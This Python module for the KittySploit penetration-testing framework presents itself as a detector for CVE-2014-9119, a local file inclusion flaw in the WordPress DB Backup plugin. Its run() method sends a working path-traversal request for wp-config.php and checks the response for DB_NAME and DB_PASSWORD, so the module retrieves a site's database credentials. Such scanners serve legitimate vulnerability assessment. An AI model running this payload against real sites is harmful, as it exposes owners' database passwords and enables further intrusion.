#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress Plugin DB Backup 4."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress DB Backup <=4.5 - Local File Inclusion Detection',
        'description': 'WordPress Plugin DB Backup 4.5 and possibly prior versions are prone to a local file inclusion vulnerability because they fail to sufficiently sanitize user-supplied input. Exploiting this issue can allow an attacker to obtain sensitive information that could aid in further attacks.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2014', 'lfi', 'wordpress', 'wp-plugin', 'wp', 'backup', 'wpscan', 'edb', 'db_backup_project', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://wpscan.com/vulnerability/d3f1e51e-5f44-4a15-97bc-5eefc3e77536',
            'https://www.exploit-db.com/exploits/35378',
            'https://nvd.nist.gov/vuln/detail/CVE-2014-9119',
            'https://wpvulndb.com/vulnerabilities/7726',
            'https://exchange.xforce.ibmcloud.com/vulnerabilities/99368',
        ],
        'cve': 'CVE-2014-9119',
    }

    def run(self):
        r = self.http_request(method="GET", path='/wp-content/plugins/db-backup/download.php?file=../../../wp-config.php', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('DB_NAME', 'DB_PASSWORD',)
        if (all(m in body for m in body_all)):
            self.set_info(
                severity='medium',
                reason="WordPress DB Backup <=4.5 - Local File Inclusion detected",
                path='/wp-content/plugins/db-backup/download.php?file=../../../wp-config.php',
            )
            return True
        return False

